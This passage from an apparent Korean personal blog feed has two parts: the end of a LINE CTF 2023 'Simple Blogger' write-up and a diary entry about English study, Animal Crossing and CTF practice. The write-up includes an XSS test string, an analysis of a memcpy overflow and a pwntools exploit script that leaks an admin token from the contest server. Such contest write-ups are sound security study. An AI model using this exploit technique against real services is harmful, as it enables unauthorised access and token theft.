class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> blog(id <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY AUTOINCREMENT, name <span class="type">VARCHAR</span>(<span class="number">20</span>), message <span class="type">VARCHAR</span>(<span class="number">500</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blog(name, message) <span class="keyword">VALUES</span>(<span class="string">&#x27;Super Admin&#x27;</span>, <span class="string">&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> account(id <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY AUTOINCREMENT, name <span class="type">VARCHAR</span>(<span class="number">20</span>), <span class="keyword">user</span> <span class="type">VARCHAR</span>(<span class="number">20</span>), pass <span class="type">VARCHAR</span>(<span class="number">20</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> account(name, <span class="keyword">user</span>, pass) <span class="keyword">VALUES</span>(<span class="string">&#x27;super_admin&#x27;</span>, <span class="string">&#x27;super_admin&#x27;</span>, HEX(RANDOMBLOB(<span class="number">16</span>)));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> account(name, <span class="keyword">user</span>, pass) <span class="keyword">VALUES</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, HEX(RANDOMBLOB(<span class="number">16</span>)));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> account(name, <span class="keyword">user</span>, pass) <span class="keyword">VALUES</span>(<span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sess(token <span class="type">BLOB</span>, priv <span class="type">INT</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sess(token, priv) <span class="keyword">VALUES</span>(RANDOMBLOB(<span class="number">16</span>), <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>ì•„ì‰½ê²Œë„ ìš°ë¦¬ëŠ” guestë°–ì— ë¡œê·¸ì¸ì„ í•˜ì§€ ëª»í•œë‹¤. <code>HEX(RANDOMBLOB(16)</code>ì€ init.sqlì´ ì‹¤í–‰ë  ë•Œ ëžœë¤í•œ ê°’ìœ¼ë¡œ ì „ë¶€ ë‹¤ ë‹¤ë¥´ê²Œ ë“¤ì–´ê°„ë‹¤. ê·¸ëž˜ì„œ ì•žì—ì„œ í•œ ê°€ì„¤ì€ ì‚¬ìš©í•˜ì§€ ëª»í–ˆë‹¤. guestë°–ì— ë¡œê·¸ì¸ì„ í•˜ì§€ ëª»í•œë‹¤ëŠ” ì‚¬ì‹¤ì„ ì¸ì§€í•˜ê³  <code>read_msg</code>ì™€ <code>write_msg</code> ê¸°ëŠ¥ì„ ì‚´íŽ´ë´¤ëŠ”ë° ë³¸ê²©ì ì¸ êµ¬í˜„ì— ì•žì„œ í† í° ê°’ê³¼ privë¥¼ í™•ì¸í•œë‹¤. ì¦‰, í•´ë‹¹ ê¸°ëŠ¥ì„ ì´ìš©í•  ìˆ˜ ìžˆëŠ”ì§€ ê¶Œí•œì„ í™•ì¸í•˜ê³  ìžˆì—ˆë‹¤. adminì´ì–´ì•¼ ë‘ ê¸°ëŠ¥ì„ ì´ìš©í•  ìˆ˜ ìžˆë‹¤.. ê·¸ëž˜ì„œ ë‘ ê¸°ëŠ¥ì€ ë³¼ í•„ìš”ê°€ ì—†ì—ˆë‹¤.</p><p>ìž ë§ˆì§€ë§‰ìœ¼ë¡œ <code>ping</code> ê¸°ëŠ¥..ë§Œ ë‚¨ì•˜ë‹¤.</p><img src="/images/230405-linectf2023-simple_blogger/ping.png" width=700/><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> token <span class="keyword">FROM</span> sess <span class="keyword">WHERE</span> rowid <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ìœ„ ì¿¼ë¦¬ë¡œ tokenì„ í•˜ë‚˜ ì½ì–´ì™€ì„œ ì§€ì—­ ë³€ìˆ˜ì— ì €ìž¥í•œë‹¤. ê·¸ë¦¬ê³  ì·¨ì•½ì ì€ ë°”ë¡œ ì•„ëž˜ì—ì„œ ë°œìƒí•œë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(ptr + <span class="number">1</span>) = size;</span><br><span class="line"><span class="built_in">memcpy</span>(ptr + <span class="number">0x10</span>, dest, *(ptr + <span class="number">1</span>)); <span class="comment">// bof</span></span><br><span class="line">print_argu(ptr);</span><br></pre></td></tr></table></figure><p>size ê°’ì€ ìš°ë¦¬ì˜ inputì´ê¸° ë•Œë¬¸ì— overflowê°€ ë°œìƒí•  ê°€ëŠ¥ì„±ì´ ìžˆë‹¤. overflowê°€ ë°œìƒí•˜ë©´ <code>dest</code> ë’¤ì— ìžˆëŠ” ê²ƒë„ ì¶œë ¥í•  ìˆ˜ ìžˆë‹¤. ë§ˆì¹¨ <code>dest</code> ë’¤ì— ìžˆëŠ” ê±´ ì•„ëž˜ì™€ ê°™ì´ <code>admin_token</code>ì´ë‹¤! ë°”ë¡œ ìµìŠ¤ ì½”ë“œë¥¼ ìž‘ì„±í•˜ëŸ¬ ê°€ìž.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">__int64 admin_token; <span class="comment">// [rsp+24h] [rbp-3Ch] BYREF</span></span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>ping</code> ê¸°ëŠ¥ì„ ì´ìš©í•´ <code>admin_token</code> leak</li><li><code>admin_token</code>ì„ ê°€ì§€ê³  <code>get_flag</code> ì‹¤í–‰!</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct, os, binascii, time</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./server/server_nix&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.146.54.86&#x27;</span>, <span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. ping</span></span><br><span class="line">msg = <span class="string">b&#x27;PING&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">1</span>) <span class="comment"># version  # 0</span></span><br><span class="line">payload += p8(<span class="number">1</span>) <span class="comment"># operation 1~6 # 1</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># 16ë°”ì´íŠ¸ token# 2</span></span><br><span class="line">payload += p16(<span class="number">0x400</span>, endian=<span class="string">&#x27;big&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line"><span class="comment"># payload += p8(0) # 18</span></span><br><span class="line"><span class="comment"># payload += p8(len(msg)+200) # 19 -&gt; length = 8</span></span><br><span class="line">payload += msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;PONG&#x27;</span>)</span><br><span class="line">token = p.recv(<span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">repr</span>(token))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. get flag</span></span><br><span class="line"></span><br><span class="line">msg = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">1</span>) <span class="comment"># version  # 0</span></span><br><span class="line">payload += p8(<span class="number">6</span>) <span class="comment"># operation 1~6 # 1</span></span><br><span class="line">payload += token <span class="comment"># 16ë°”ì´íŠ¸ token# 2</span></span><br><span class="line">payload += p16(<span class="built_in">len</span>(msg), endian=<span class="string">&#x27;big&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line">payload += msg</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="/images/230405-linectf2023-simple_blogger/flag.png" width=500/><br><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>ì²˜ìŒì— agent í´ë”ë¥¼ í™•ì¸í–ˆìœ¼ë©´ ë¬¸ì œ í’€ì´ê°€ ë” ë¹¨ëžì„ ê²ƒì´ë¼ íŒë‹¨ëœë‹¤. agent í´ë”ì—ì„œëŠ” cronì„ ì´ìš©í•´ì„œ ë§¤ë¶„ë§ˆë‹¤ adminìœ¼ë¡œ ë¡œê·¸ì¸í•´ì„œ database ë‚´ìš©ì„ ì§€ìš°ëŠ” ì—­í• ì„ í•œë‹¤. ì°¸ê³ ë¡œ ì´ ê¸°ëŠ¥ì€ <code>ping</code> í•¨ìˆ˜ì— ìžˆë‹¤. ì•„ë¬´íŠ¼ ì €ëŸ° ì—­í• ì„ í•˜ëŠ”ë°, ì €ê±¸ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ê°€ í•˜ë‚˜ ë“¤ì–´ìžˆì—ˆë‹¤. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>():</span><br><span class="line">    payload = <span class="string">b&#x27;\x01\x02&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;\x41&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cred = <span class="string">&#x27;&#123;0&#125;:&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(ADMIN_USER, ADMIN_PASS)</span><br><span class="line">    cred_len = <span class="built_in">len</span>(cred)</span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, cred_len)</span><br><span class="line">    payload += cred.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>ì¼ë¶€ë¶„ë§Œ ê°€ì ¸ì™”ëŠ”ë°, ì´ê±¸ ë¹¨ë¦¬ ë´¤ìœ¼ë©´ êµ¬ì¡°ì²´ë¥¼ ë” ì‰½ê³  ë¹ ë¥´ê²Œ ë¶„ì„í•´ì„œ ì„œë²„ì˜ ê¸°ëŠ¥ì„ ì¡°ê¸ˆ ë” ë¹¨ë¦¬ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìžˆì§€ ì•Šì•˜ì„ê¹Œ ë¼ëŠ” ìƒê°ì´ ë“ ë‹¤. í•˜ì§€ë§Œ ë•ë¶„ì— ë¶„ì„ì— ëŒ€í•œ ìžì‹ ê°ì„ ì–»ì—ˆìœ¼ë‹ˆ.. ë‚˜ìœê±´ ì—†ë‹¤ê³  ìƒê°ëœë‹¤.</p><p>ê·¸ë¦¬ê³  ì´ cronìœ¼ë¡œ ì²˜ìŒì— ìµìŠ¤ ë°©í–¥ì„ í—·ê°ˆë ¸ëŠ”ë°, ì € íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ë©´ ë©”ëª¨ë¦¬ì— adminì˜ passwordê°€ ë‚¨ì•„ì„œ <code>ping</code> í•¨ìˆ˜ë¥¼ í†µí•´ leakí•  ìˆ˜ ìžˆì—ˆë‹¤. (ë¬¼ë¡  ë¡œì»¬ì—ì„œë§Œ.. ë„ì»¤ë„ ì•„ë‹ˆê³ ..) ë¡œì»¬ì—ì„œë§Œ ê°€ëŠ¥í–ˆë˜ ì´ìœ ëŠ” .. ì € íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ìµìŠ¤ ì½”ë“œì— í¬í•¨ì‹œì¼œ croní•˜ëŠ” ê²ƒì²˜ëŸ¼ í•´ì¤¬ë‹¤. ì´ë ‡ê²Œ í•˜ë©´ í°ì¼ë‚œë‹¤. ã…Ž ì• ì´ˆì— ë§ë„ ì•ˆë˜ëŠ” ìƒê°ì´ë‹ˆ ì´í•´í•˜ë ¤ê³  í•˜ì§€ ë§ìž.</p><p>ì•„ ê·¸ë¦¬ê³  ì¼ì£¼ì¼ ì „ì— ëŒ€íšŒ ì„œë²„ë¡œ ë¬¸ì œë¥¼ í’€ ë•Œ guestë¡œë„ ë¡œê·¸ì¸ì´ ì•ˆë˜ëŠ” ì´ìŠˆê°€ ìžˆì—ˆë‹¤. ëŒ€íšŒ ì¤‘ì—ëŠ” ë¬¸ì œ í‘¸ëŠ”ë° ì§€ìž¥ì´ ì—†ë‹¤ê³  ê³µì§€í•˜ì˜€ë‹¤ê³  í•œë‹¤. ëŒ€íšŒ ë•Œ í’€ì´í•˜ë ¤ê³  í–ˆìœ¼ë©´.. <code>ping</code> í•¨ìˆ˜ë§Œ ì—´ì‹¬ížˆ ë´¤ê² ì§€..? ì•„ë¬´íŠ¼ ì´ë²ˆ ê¸°íšŒë¥¼ í†µí•´ ctf ê¸°ê°„ì— ì—´ì‹¬ížˆ ì°¸ì—¬í•´ì•¼í•  ì´ìœ ë¥¼ ëŠê¼ˆë‹¤. ê¸°ê°„ ë‚´ì— í’€ì—ˆìœ¼ë©´ ë” ê¸°ë¶„ ì¢‹ì•˜ì„ ê²ƒ ê°™ë‹¤. ì‚¬ì‹¤ ëë‚˜ê³  í’€ì–´ë„ ê¸°ë¶„ì¢‹ê¸´ í•˜ë‹¤.</p><p>ì´ ë¬¸ì œë¥¼ í’€ê³  ê·¸ ë‹¤ìŒ ë¬¸ì œë„ ì—´ì–´ë´¤ëŠ”ë° ì‚¬ì‹¤ ì•„ì§ê¹Œì§€ ìµìŠ¤ ì½”ë“œë¥¼ ìŠ¤ìŠ¤ë¡œ ìž‘ì„±í•˜ì§€ ëª»í•˜ì˜€ë‹¤. ìš”ì¦˜ ë‹¤ë¥¸ê±°ì— ë¹ ì ¸ì„œ.. ì•„ë¬´íŠ¼ comming soon..</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> LINE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leak </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-03-31 Diary</title>
      <link href="/230331-diary/"/>
      <url>/230331-diary/</url>
      
        <content type="html"><![CDATA[<p>ë²Œì¨ 2023ë…„ 1ë¶„ê¸°ê°€ ëë‚¬ë‹¤. ê·¸ë¦¬ê³  ì˜¬í•´ ì²« ì¼ê¸°ë¥¼ ì¨ë³´ë ¤ê³  í•œë‹¤. </p><h2 id="Github-Blog-ISSUE"><a href="#Github-Blog-ISSUE" class="headerlink" title="Github Blog ISSUE"></a>Github Blog ISSUE</h2><p>ì–¼ë§ˆ ì „ì— ì´ ë¸”ë¡œê·¸ì— ì´ìŠˆê°€ ìžˆì—ˆë‹¤. (ì‚¬ì‹¤ ë°”ë¡œ ì–´ì œ..) localhostì—ì„œëŠ” ë³€ê²½ì‚¬í•­ì´ ëª¨ë‘ ë°˜ì˜ë˜ì—ˆëŠ”ë° ë§‰ìƒ deployë¥¼ í•˜ë‹ˆ ë³€ê²½ì‚¬í•­ì´ í•˜ë‚˜ë„ ì €ìž¥ ì•ˆëœ ê²ƒì´ë‹¤;; ìš¸ ë»” í–ˆë‹¤. í•˜ì§€ë§Œ ìž‘ì€ ë³€ê²½ì‚¬í•­ì„ ì¤€ ë’¤ì— ë‹¤ì‹œ ì‹œë„í•´ë³´ë‹ˆ deployê°€ ìž˜ ë˜ì—ˆë‹¤. </p><img src="/images/230331-diary/Screenshot 2023-03-31 at 14.56.53.png" width=500/><br><h2 id="English"><a href="#English" class="headerlink" title="English"></a>English</h2><p>ì˜ì–´ ê³µë¶€ë¥¼ ì—´ì‹¬ížˆ í•˜ê³  ìžˆë‹¤. ë§í•˜ëŠ” ë° ìžˆì–´ì„œ ë¬¸ìž¥ êµ¬ì¡°ê°€ í—·ê°ˆë¦°ë‹¤? ë‚˜ëŠ” ë¬¸ë²•ì´ ë¶€ì¡±í–ˆê³  ê³µë¶€í•´ë³´ë‹ˆ íŠ¹ížˆ ì‹œì œì— ëŒ€í•œ ì´í•´ê°€ ë‚®ì•˜ë‹¤. <code>The present perfact tense</code> ë¼ëŠ” ë¬¸ë²•ì´ ìžˆëŠ”ë° í•œêµ­ì–´ë¡œëŠ” ê³¼ê±°ë¶„ì‚¬ë¼ê³  í–ˆë˜ ê²ƒ ê°™ë‹¤. ì•„ë¬´íŠ¼ ì € ì‹œì œì˜ ë¬¸ìž¥ì„ ë³´ë©´ ê°ì´ ìž˜ ì•ˆì™”ëŠ”ë° ë“œë””ì–´ ê°ì„ ìž¡ê³  ì´í•´ë¥¼ í–ˆë‹¤. 10ëŒ€ ë•Œ ë¶„ëª… ê³µë¶€í–ˆì„ ê±´ë° ê·¸ë•ŒëŠ” ì–´ë–»ê²Œ ì´í•´í–ˆëŠ”ì§€ ê¸°ì–µì´ ìž˜ ì•ˆë‚œë‹¤. </p><p>ì‹ ê¸°í•œ ê²ƒì´ ê³µë¶€ë¥¼ í•˜ë‹¤ë³´ë‹ˆ ë‚˜ì˜ ì•½ì ì„ íŒŒì•…í•  ìˆ˜ ìžˆì—ˆë‹¤. ì˜ì–´ ê³µë¶€ë¥¼ ì‹œìž‘í•˜ê¸° ì „ì—ëŠ” ë¦¬ë”©, ë¦¬ìŠ¤ë‹, ìŠ¤í”¼í‚¹, ë¡¸ì´íŒ… ì¤‘ ë­ê°€ ê°€ìž¥ ìžì‹ ìžˆê³  ë¶€ì¡±í•œì§€ ëª°ëžë‹¤. í•˜ì§€ë§Œ ê³µë¶€ë¥¼ ì§„í–‰í•˜ë‹¤ ë³´ë‹ˆ ìŠ¤í”¼í‚¹ì´ ì •ë§ì •ë§ ë¶€ì¡±í•œ ê²ƒì„ ê¹¨ë‹¬ì„ ìˆ˜ ìžˆì—ˆë‹¤. ê·¸ë¦¬ê³  ì˜ì™¸ë¡œ ë¦¬ìŠ¤ë‹ ì‹¤ë ¥ì´ ê°€ìž¥ ì¢‹ì€ ê²ƒ ê°™ë‹¤. ë¦¬ë”©ì€ ê´€ì‹¬ ìžˆëŠ” ì£¼ì œëŠ” ìž˜ ì½ížˆëŠ” ê²ƒ ê°™ë‹¤. (ëª¨ë¥´ëŠ” ë‹¨ì–´ê°€ ì—†ì–´ì„œ ê·¸ëŸ´ ê²ƒì´ë¼ ìƒê°í•œë‹¤.) ìš”ì¦˜ ëª¨ë™ìˆ²ì— ë¹ ì¡ŒëŠ”ë° Redditì—ì„œ ëª¨ë™ìˆ² ê´€ë ¨ ê¸€ì´ ìžì£¼ ì˜¬ë¼ì˜¤ë‹¤ë³´ë‹ˆê¹Œ ì‹¬ì‹¬í•  ë•Œ ì½ìœ¼ë©´ ìž¬ë°Œë‹¤. ì‚¬ì‹¤ ìž¬ë°Œë‹¤ê¸° ë³´ë‹¤ëŠ” ëª¨ë¥´ëŠ” ì‚¬ì‹¤ì„ ì•Œê²Œë˜ê±°ë‚˜ ê·€ì—¬ìš´ ê²ƒë“¤ì„ ë³¼ ìˆ˜ ìžˆê²Œ ëœë‹¤. ìŠ¤í”¼í‚¹ì´ ê°€ìž¥ ë¶€ì¡±í•œ ì´ìœ ê°€ ë‚´ê°€ ë¶€ë„ëŸ¬ì›€ì´ ë§Žì€ ì„±ê²©ì´ê¸° ë•Œë¬¸ì´ë¼ê³  ìƒê°ëœë‹¤. ê·¹ë³µí•˜ê³  ì‹¶ì€ë° ìƒê°ë³´ë‹¤ ì‰½ì§€ ì•Šë‹¤.</p><h2 id="ACNH-Animal-Crossing-New-Horizon"><a href="#ACNH-Animal-Crossing-New-Horizon" class="headerlink" title="ACNH (Animal Crossing New Horizon)"></a>ACNH (Animal Crossing New Horizon)</h2><p>ìž‘ë…„ ë§ì— ë‹Œí…ë„ ìŠ¤ìœ„ì¹˜ëž‘ ëª¨ì—¬ë´ìš” ë™ë¬¼ì˜ ìˆ² ê²Œìž„ì„ ì„ ë¬¼ë°›ì•˜ë‹¤. ê·¸ ë•Œ ì—´ì‹¬ížˆ í•˜ë‹¤ê°€ ìƒˆí•´ ë•Œ ì˜¤ëžœë§Œì— ë“¤ì–´ê°€ê³  3ì›”ê¹Œì§€ ê·¸ëŒ€ë¡œ ë°©ì¹˜í•´ë’€ë‹¤ê°€ 3ì›” ì´ˆì— ê¹”ë”í•˜ê²Œ ë¦¬ì…‹í–ˆë‹¤. ì§€ê¸ˆì€ ë§¤ìš° ìž¬ë°Œê²Œ ì¦ê¸°ê³  ìžˆë‹¤. ì§€í˜• ê³µì‚¬ë¥¼ í•˜ê³  ìžˆëŠ”ë° ë…¸ê°€ë‹¤ ê³¼ì •ì´ê¸´ í•´ë„ ë¿Œë“¯í•˜ê³  ë‚˜ë¦„ ìž¬ë°Œë‹¤. (ë‚´ ìºë¦­í„°ê°€ ê·€ì—¬ì›Œì„œ ë””ìŠ¤ì½”ë“œ í”„ë¡œí•„ ì‚¬ì§„ë„ ë³€ê²½í–ˆë‹¤.) ê·¸ë¦¬ê³  ì£¼ë¯¼ë“¤ê³¼ ì´ì•¼ê¸°í•˜ë‹¤ë³´ë©´ ë„ˆë¬´ ížë§ëœë‹¤.</p><p>ë¬´íŠ¸ì½”ì¸ìœ¼ë¡œ 800ë§Œì›ì •ë„ ë²Œì–´ì„œ ì•„ì§ ëˆ ê±±ì • ì—†ì´ í–‰ë³µí•˜ê²Œ ì¦ê¸°ê³  ìžˆë‹¤. ì§€ê¸ˆê¹Œì§€ ì•½ 120ì‹œê°„ ì •ë„ í•œ ë“¯..</p><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h2><p>Streak ì§„ì§œ.. ã…‹ã…‹ ì¤‘ê°„ì— ê¹¨ì ¸ì„œ ë‹¤ì‹œ í•˜ê³  ìžˆëŠ”ë° ì—„í•œ ê³³ì— Streak freeze ì¨ë²„ë ¸ë‹¤.. í•˜.. ì•„ì§ ì‹¤ë²„1ì¸ë° ì–¸ì œ ê³¨ë“œë ê¹Œ? ë¼ê³  ë§í•˜ê¸°ì—ëŠ” ìš”ì¦˜ ì•Œê³ ë¦¬ì¦˜í•˜ê¸° ê·€ì°®ì•„ì„œ ì‰¬ìš´ ê²ƒë§Œ ê³¨ë¼ í’€ê³  ìžˆë‹¤.  </p><img src="/images/230331-diary/Screenshot 2023-03-31 at 15.51.38.png" width=600/><br><p>ê°‘ìžê¸° solve.ac UIê°€ ë°”ë€Œì–´ì„œ ì¢€ ë‹¹í™©í–ˆì§€ë§Œ.. ê°œì¸ì ìœ¼ë¡œ ì´ì „ UIê°€ ë” ì¢‹ì€ ê²ƒ ê°™ë‹¤.. </p><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>ì›¬ë§Œí•˜ë©´ CTFë¥¼ ê¾¸ì¤€ížˆ ì°¸ì—¬í•˜ë ¤ê³  ë…¸ë ¥í•˜ê³  ìžˆë‹¤. 2023ë…„ ê¸°ì¤€ ê¸°ì–µì— ë‚¨ëŠ” ë¬¸ì œë¥¼ ì†Œê°œí•œë‹¤.</p><ul><li>idek CTFì˜ Spinterë¬¸ì œ: <a href="https://jiravvit.github.io/230117-idekctf2023-sprinter/">https://jiravvit.github.io/230117-idekctf2023-sprinter/</a></li></ul><p>FSBë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìžˆëŠ”ë° <code>n</code>ì´ í•„í„°ë§ë˜ì–´ ìžˆë‹¤. ì–´ë–»ê²Œ overflowë¥¼ ì¼ìœ¼ì¼œì•¼í•˜ëŠ”ì§€ ê³ ë¯¼ì„ í•´ì•¼í•œë‹¤. ë˜í•œ canaryê°€ ìžˆê¸° ë•Œë¬¸ì— ì´ë¥¼ ì–´ë–»ê²Œ ìš°íšŒí•˜ê±°ë‚˜ leakí•´ì•¼í•  ì§€. ìž˜ ë³´ì¡´ì„ ì–´ë–»ê²Œ í•´ì•¼í•  ì§€ ê³ ë¯¼í•  ìˆ˜ ìžˆëŠ” ë¬¸ì œë‹¤.</p><ul><li>Karmar CTFì˜ mjsë¬¸ì œ: <a href="https://jiravvit.github.io/230318-kalmarctf2023-mjs/">https://jiravvit.github.io/230318-kalmarctf2023-mjs/</a></li></ul><p>ì²« JS engine exploitì´ë¼ê³  ê±°ì°½í•˜ê²Œ ë§í•˜ì§€ë§Œ ì˜ì™¸ë¡œ ì‰½ê²Œ ë¬¸ì œ í’€ ìˆ˜ ìžˆëŠ” ë°©í–¥ì´ ì¡´ìž¬í•œë‹¤. javascriptë¡œ ìµìŠ¤ ì½”ë“œë¥¼ ìž‘ì„±í•˜ëŠ” ê±´ ì—­ì‹œë‚˜ ì–´ë µë‹¤. ì´ ë¬¸ì œë¥¼ í’€ë©´ì„œ ë‹¤ë¥¸ ìœ ëª…í•œ JS engine 1-day ë¶„ì„í•´ë³´ê³  ì‹¶ë‹¤ê³  ìƒê°í–ˆë‹¤. ë¶„ì„í•˜ê²Œ ë˜ë©´.. ë¸”ë¡œê·¸ì— ì •ë¦¬í•˜ë„ë¡ ë…¸ë ¥í•´ë³´ê² ë‹¤.</p><ul><li>Wolv CTFì˜ WTMLë¬¸ì œ: <a href="https://jiravvit.github.io/230322-wolvctf2023-WTML/">https://jiravvit.github.io/230322-wolvctf2023-WTML/</a></li></ul><p>ì–¼ë§ˆ ì „ì— ìžˆì—ˆë˜ ì”¨í…ì´ë‹¤. ê²½ê³„ ê²€ì‚¬ë¥¼ ì œëŒ€ë¡œ ëª»í•´ì„œ oobê°€ ë°œìƒí•˜ëŠ” ë¬¸ì œëŠ” ë‚´ê°€ ìž˜ ëª»ì°¾ê¸°ë„ í•˜ê³  ë¬¸ì œ í’€ê³  ë¿Œë“¯í•´ì„œ ì—¬ê¸° ë„£ì–´ë´¤ë‹¤.</p><ul><li>Line CTFì˜ Simple Bloggerë¬¸ì œ: ì—…ë¡œë“œ ì˜ˆì •</li></ul><p>ëŒ€íšŒ ë–„ í’€ì—ˆìœ¼ë©´ ë” ì‰½ê³  ë¹¨ë¦¬ í’€ì—ˆì„ í…ë°.. ì§„ì§œ ë„ˆë¬´ ì•„ì‰½ë‹¤. ëŒ€íšŒ ë„ì¤‘ ì•½ì†ì´ ìžˆì–´ì„œ ëŒ€íšŒë¥¼ ì°¸ì—¬í•˜ì§€ ëª»í•˜ê³  ëŒ€íšŒ ëë‚˜ê³  ë¬¸ì œë¥¼ í’€ì–´ë´¤ë‹¤. ì •ë§ ì—´ì‹¬ížˆ ë¶„ì„í–ˆê³  ë¶„ì„ì„ ì—„ì²­ ì—´ì‹¬ížˆ í•œ ê±°ì— ë¹„í•´ ì–´ì´ì—†ê²Œ ë¬¸ì œê°€ í’€ë ¸ë‹¤. ë¶„ì„í•˜ë©´ì„œ ìž‘ë…„ ì´ë§˜ ë•Œì˜ ë‚˜ëŠ” ì ˆëŒ€ ëª»í‘¸ëŠ” ë¬¸ì œì¼ ê²ƒì´ë¼ëŠ” ìƒê°ì´ ë“¤ì—ˆë‹¤. ë‹¤ë¥¸ ë¬¸ì œë¥¼ í‘¸ëŠë¼ ì•„ì§ ë¸”ë¡œê·¸ì— ì—…ë¡œë“œ í•˜ì§€ëŠ” ì•Šì•˜ëŠ”ë° ë¹¨ë¦¬ ì—…ë¡œë“œí•´ì•¼ê² ë‹¤.</p><ul><li>Line CTFì˜ Hackatrisë¬¸ì œ: ì—…ë¡œë“œ ì˜ˆì •</li></ul><p>ê°œì¸ì ìœ¼ë¡œ ê²Œìž„ ê´€ë ¨ëœ ë¬¸ì œë¥¼ ì•ˆì¢‹ì•„í•œë‹¤. ë¶„ì„ì´ ê¹Œë‹¤ë¡­ê³  